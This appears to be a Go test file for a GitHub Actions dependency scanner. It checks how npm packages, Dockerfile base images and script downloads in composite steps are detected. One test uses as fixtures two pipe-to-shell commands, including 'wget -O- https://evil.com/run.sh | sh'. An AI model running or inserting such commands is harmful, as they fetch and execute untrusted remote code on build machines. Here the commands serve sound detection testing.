// internal/actions/bundled_test.go
package actions

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// makeFileContentResponse creates a GitHub contents API JSON response for the
// given file content (base64-encoded, matching what the real API returns).
func makeFileContentResponse(content string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(content))
	resp := map[string]string{
		"content":  encoded,
		"encoding": "base64",
	}
	b, _ := json.Marshal(resp)
	return string(b)
}

const samplePackageJSON = `{
  "name": "my-action",
  "version": "1.0.0",
  "dependencies": {
    "@actions/core": "^1.10.0",
    "@actions/github": "^6.0.0"
  },
  "devDependencies": {
    "typescript": "^5.0.0"
  }
}`

const samplePackageLockJSON = `{
  "lockfileVersion": 3,
  "packages": {
    "node_modules/@actions/core": { "version": "1.10.1" },
    "node_modules/@actions/github": { "version": "6.0.0" },
    "node_modules/typescript": { "version": "5.3.3" }
  }
}`

const sampleDockerfile = `FROM node:20-alpine
WORKDIR /app
COPY package.json .
RUN npm install
COPY . .
ENTRYPOINT ["node", "dist/index.js"]
`

const testBundledSHA = "aabbccddee112233445566778899aabbccddee11"

// newBundledTestResolver creates a Resolver backed by srv with no cache.
func newBundledTestResolver(t *testing.T, srv *httptest.Server) *Resolver {
	t.Helper()
	return NewResolver("fake-token", WithBaseURL(srv.URL))
}

// TestFetchBundledDepsNilResolved checks that nil resolved returns an error.
func TestFetchBundledDepsNilResolved(t *testing.T) {
	resolver := NewResolver("")
	ref := ParseActionRef("actions/checkout@v4")
	_, err := FetchBundledDeps(context.Background(), resolver, ref, nil)
	require.Error(t, err)
}

// TestFetchBundledDepsJSAction tests fetching package.json + package-lock.json
// for a Node.js action.
func TestFetchBundledDepsJSAction(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/repos/myorg/myaction/contents/package.json", func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, testBundledSHA, r.URL.Query().Get("ref"))
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, makeFileContentResponse(samplePackageJSON))
	})
	mux.HandleFunc("/repos/myorg/myaction/contents/package-lock.json", func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, testBundledSHA, r.URL.Query().Get("ref"))
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, makeFileContentResponse(samplePackageLockJSON))
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	resolver := newBundledTestResolver(t, srv)
	ref := ParseActionRef("myorg/myaction@" + testBundledSHA)
	resolved := &ResolvedAction{
		Ref:  ref,
		SHA:  testBundledSHA,
		Type: ActionNode,
	}

	deps, err := FetchBundledDeps(context.Background(), resolver, ref, resolved)
	require.NoError(t, err)
	require.NotNil(t, deps)

	// Should have 3 packages: @actions/core, @actions/github, typescript
	assert.Len(t, deps.NPMPackages, 3)
	assert.Nil(t, deps.Dockerfile)
	assert.Empty(t, deps.ScriptDownloads)

	// Check that resolved versions came from the lockfile
	pkgByName := make(map[string]string)
	for _, p := range deps.NPMPackages {
		pkgByName[p.Name] = p.ResolvedVersion
	}
	assert.Equal(t, "1.10.1", pkgByName["@actions/core"])
	assert.Equal(t, "6.0.0", pkgByName["@actions/github"])
	assert.Equal(t, "5.3.3", pkgByName["typescript"])
}

// TestFetchBundledDepsJSActionNoLockfile tests that missing package-lock.json
// is handled gracefully (only package.json constraints returned).
func TestFetchBundledDepsJSActionNoLockfile(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/repos/myorg/myaction/contents/package.json", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, makeFileContentResponse(samplePackageJSON))
	})
	mux.HandleFunc("/repos/myorg/myaction/contents/package-lock.json", func(w http.ResponseWriter, r *http.Request) {
		http.NotFound(w, r)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	resolver := newBundledTestResolver(t, srv)
	ref := ParseActionRef("myorg/myaction@" + testBundledSHA)
	resolved := &ResolvedAction{
		Ref:  ref,
		SHA:  testBundledSHA,
		Type: ActionNode,
	}

	deps, err := FetchBundledDeps(context.Background(), resolver, ref, resolved)
	require.NoError(t, err)
	require.NotNil(t, deps)
	// 3 packages from package.json only (no resolved versions)
	assert.Len(t, deps.NPMPackages, 3)
}

// TestFetchBundledDepsJSActionNoPackageJSON tests that a missing package.json
// returns empty deps without error (non-fatal).
func TestFetchBundledDepsJSActionNoPackageJSON(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/repos/myorg/myaction/contents/package.json", func(w http.ResponseWriter, r *http.Request) {
		http.NotFound(w, r)
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	resolver := newBundledTestResolver(t, srv)
	ref := ParseActionRef("myorg/myaction@" + testBundledSHA)
	resolved := &ResolvedAction{
		Ref:  ref,
		SHA:  testBundledSHA,
		Type: ActionNode,
	}

	deps, err := FetchBundledDeps(context.Background(), resolver, ref, resolved)
	require.NoError(t, err)
	require.NotNil(t, deps)
	assert.Empty(t, deps.NPMPackages)
}

// TestFetchBundledDepsDockerActionWithDockerfile tests fetching and parsing a
// Dockerfile for a Docker action whose runs.image = "Dockerfile".
func TestFetchBundledDepsDockerActionWithDockerfile(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/repos/myorg/dockeraction/contents/Dockerfile", func(w http.ResponseWriter, r *http.Request) {
		assert.Equal(t, testBundledSHA, r.URL.Query().Get("ref"))
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprint(w, makeFileContentResponse(sampleDockerfile))
	})
	srv := httptest.NewServer(mux)
	defer srv.Close()

	resolver := newBundledTestResolver(t, srv)
	ref := ParseActionRef("myorg/dockeraction@" + testBundledSHA)
	resolved := &ResolvedAction{
		Ref:  ref,
		SHA:  testBundledSHA,
		Type: ActionDocker,
		ActionYAML: &ActionYAML{
			Runs: ActionYAMLRuns{
				Using: "docker",
				Image: "Dockerfile",
			},
		},
	}

	deps, err := FetchBundledDeps(context.Background(), resolver, ref, resolved)
	require.NoError(t, err)
	require.NotNil(t, deps)
	require.NotNil(t, deps.Dockerfile)

	assert.Len(t, deps.Dockerfile.BaseImages, 1)
	assert.Equal(t, "node", deps.Dockerfile.BaseImages[0].Image)
	assert.Equal(t, "20-alpine", deps.Dockerfile.BaseImages[0].Tag)
	assert.True(t, deps.Dockerfile.HasNpmInstall)
	assert.Empty(t, deps.NPMPackages)
}

// TestFetchBundledDepsDockerActionInlineImage tests that an inline docker image
// reference (not a Dockerfile) is recorded without any API call.
func TestFetchBundledDepsDockerActionInlineImage(t *testing.T) {
	// No API calls expected
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Errorf("unexpected API call: %s", r.URL.Path)
	}))
	defer srv.Close()

	resolver := newBundledTestResolver(t, srv)
	ref := ParseActionRef("myorg/dockeraction@" + testBundledSHA)
	resolved := &ResolvedAction{
		Ref:  ref,
		SHA:  testBundledSHA,
		Type: ActionDocker,
		ActionYAML: &ActionYAML{
			Runs: ActionYAMLRuns{
				Using: "docker",
				Image: "alpine:3.19",
			},
		},
	}

	deps, err := FetchBundledDeps(context.Background(), resolver, ref, resolved)
	require.NoError(t, err)
	require.NotNil(t, deps)
	require.NotNil(t, deps.Dockerfile)
	assert.Len(t, deps.Dockerfile.BaseImages, 1)
	assert.Equal(t, "alpine", deps.Dockerfile.BaseImages[0].Image)
	assert.Equal(t, "3.19", deps.Dockerfile.BaseImages[0].Tag)
}

// TestFetchBundledDepsDockerInlineRef tests a uses: docker://alpine:3.19 ref
// (no ActionYAML, DockerImage field set on the ref).
func TestFetchBundledDepsDockerInlineRef(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Errorf("unexpected API call: %s", r.URL.Path)
	}))
	defer srv.Close()

	resolver := newBundledTestResolver(t, srv)
	ref := ParseActionRef("docker://alpine:3.19")
	resolved := &ResolvedAction{
		Ref:  ref,
		Type: ActionDocker,
		// No ActionYAML — inline docker ref
	}

	deps, err := FetchBundledDeps(context.Background(), resolver, ref, resolved)
	require.NoError(t, err)
	require.NotNil(t, deps)
	require.NotNil(t, deps.Dockerfile)
	assert.Len(t, deps.Dockerfile.BaseImages, 1)
	assert.Equal(t, "alpine", deps.Dockerfile.BaseImages[0].Image)
	assert.Equal(t, "3.19", deps.Dockerfile.BaseImages[0].Tag)
}

// TestFetchBundledDepsCompositeAction tests script download detection in
// composite action run: steps.
func TestFetchBundledDepsCompositeAction(t *testing.T) {
	// No API calls expected for composite actions
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		t.Errorf("unexpected API call: %s", r.URL.Path)
	}))
	defer srv.Close()

	resolver := newBundledTestResolver(t, srv)
	ref := ParseActionRef("myorg/compositeaction@v1")
	resolved := &ResolvedAction{
		Ref:  ref,
		SHA:  testBundledSHA,
		Type: ActionComposite,
		ActionYAML: &ActionYAML{
			Runs: ActionYAMLRuns{
				Using: "composite",
				Steps: []struct {
					Uses string `yaml:"uses"`
					Run  string `yaml:"run"`
				}{
					{Uses: "actions/checkout@v4"},
					{Run: "echo hello"},
					{Run: "curl -sSL https://install.example.com/setup.sh | bash"},
					{Run: "npm test"},
					{Run: "wget -O- https://evil.com/run.sh | sh"},
				},
			},
		},
	}

	deps, err := FetchBundledDeps(context.Background(), resolver, ref, resolved)
	require.NoError(t, err)
	require.NotNil(t, deps)

	// Two script downloads detected
	assert.Len(t, deps.ScriptDownloads, 2)
	assert.Equal(t, "https://install.example.com/setup.sh", deps.ScriptDownloads[0].URL)
	assert.Equal(t, "https://evil.com/run.sh", deps.ScriptDownloads[1].URL)

	assert.Empty(t, deps.NPMPackages)
	assert.Nil(t, deps.Dockerfile)
}

// TestFetchBundledDepsCompositeNoScripts tests a composite action with no
// dangerous run: steps returns empty ScriptDownloads.
func TestFetchBundledDepsCompositeNoScripts(t *testing.T) {
	resolver := NewResolver("")
	ref := ParseActionRef("myorg/compositeaction@v1")
	resolved := &ResolvedAction{
		Ref:  ref,
		SHA:  testBundledSHA,
		Type: ActionComposite,
		ActionYAML: &ActionYAML{
			Runs: ActionYAMLRuns{
				Using: "composite",
				Steps: []struct {
					Uses string `yaml:"uses"`
					Run  string `yaml:"run"`
				}{
					{Uses: "actions/checkout@v4"},
					{Run: "echo safe"},
				},
			},
		},
	}

	deps, err := FetchBundledDeps(context.Background(), resolver, ref, resolved)
	require.NoError(t, err)
	require.NotNil(t, deps)
	assert.Empty(t, deps.ScriptDownloads)
}

// TestFetchBundledDepsUnknownType tests that ActionUnknown returns empty deps.
func TestFetchBundledDepsUnknownType(t *testing.T) {
	resolver := NewResolver("")
	ref := ParseActionRef("./local-action")
	resolved := &ResolvedAction{
		Ref:  ref,
		Type: ActionUnknown,
	}

	deps, err := FetchBundledDeps(context.Background(), resolver, ref, resolved)
	require.NoError(t, err)
	require.NotNil(t, deps)
	assert.Empty(t, deps.NPMPackages)
	assert.Nil(t, deps.Dockerfile)
	assert.Empty(t, deps.ScriptDownloads)
}
